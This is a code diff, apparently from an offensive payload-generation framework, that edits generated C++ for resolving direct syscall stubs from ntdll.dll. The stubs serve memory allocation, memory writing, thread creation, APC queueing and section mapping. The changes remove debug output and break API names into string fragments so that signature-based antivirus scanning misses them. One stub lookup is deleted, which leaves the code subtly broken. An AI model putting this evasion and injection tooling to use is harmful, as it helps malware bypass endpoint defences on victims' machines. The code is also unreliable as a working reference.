@@ -58,7 +58,7 @@ class SysCallsControler:
         module = None
         if self.sysCallsType == "":
             module = self.get_noSysCall_module()
-
+        
         elif self.sysCallsType == "GetSyscallStub":
             module = self.get_GetSyscallStub_module()
 
@@ -341,8 +341,9 @@ class SysCallsControler:
     NtFreeVirtualMemory = (myNtFreeVirtualMemory)syscallStub_NtFreeVirtualMemory;
     VirtualProtect(syscallStub_NtFreeVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
+    String scl = std::string("c\\")+"wi"+"nDowS\\s"+"Y"+"ste"+"m32\\ntd"+"ll"+".dll";
 
-    file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    file = CreateFileA("c:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     fileSize = GetFileSize(file, NULL);
     fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
     ReadFile(file, fileData, fileSize, &bytesRead, NULL);
@@ -367,58 +368,57 @@ class SysCallsControler:
 
     String scall = std::string("N") + "t" + "A" + "l" + "l" + "o" + "c" + "a" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
     BOOL StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAllocateVirtualMemory);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
-    scall = std::string("N") + "t" + "W" + "r" + "i" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
+
+    scall = std::string("N") + "tW" + "r" + "i" + "teV" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWriteVirtualMemory);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "P" + "r" + "o" + "t" + "e" + "c" + "t" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtProtectVirtualMemory);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "C" + "r" + "e" + "a" + "t" + "e" + "T" + "h" + "r" + "e" + "a" + "d" + "E" + "x";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtCreateThreadEx);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtResumeThread);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "W" + "a" + "i" + "t" + "F" + "o" + "r" + "S" + "i" + "n" + "g" + "l" + "e" + "O" + "b" + "j" + "e" + "c" + "t";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWaitForSingleObject);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "Q" + "u" + "e" + "r" + "y" + "I" + "n" + "f" + "o" + "r" + "m" + "a" + "t" + "i" + "o" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueryInformationProcess);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "R" + "e" + "a" + "d" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtReadVirtualMemory);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "C" + "l" + "o" + "s" + "e";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtClose);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "O" + "p" + "e" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtOpenProcess);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "Q" + "u" + "e" + "u" + "e" + "A" + "p" + "c" + "T" + "h" + "r" + "e" + "a" + "d";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueueApcThread);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "A" + "l" + "e" + "r" + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAlertResumeThread);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "G" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
-    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtGetContextThread);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "S" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtSetContextThread);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "D" + "e" + "l" + "a" + "y" + "E" + "x" + "e" + "c" + "u" + "t" + "i" + "o" + "n";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtDelayExecution);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "O" + "p" + "e" + "n" + "S" + "e" + "c" + "t" + "i" + "o" + "n";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtOpenSection);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "M" + "a" + "p" + "V" + "i" + "e" + "w" + "O" + "f" + "S" + "e" + "c" + "t" + "i" + "o" + "n";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtMapViewOfSection);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
     scall = std::string("N") + "t" + "F" + "r" + "e" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtFreeVirtualMemory);
-    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
+
         """),
         IncludeComponent("<winternl.h>")
         ]
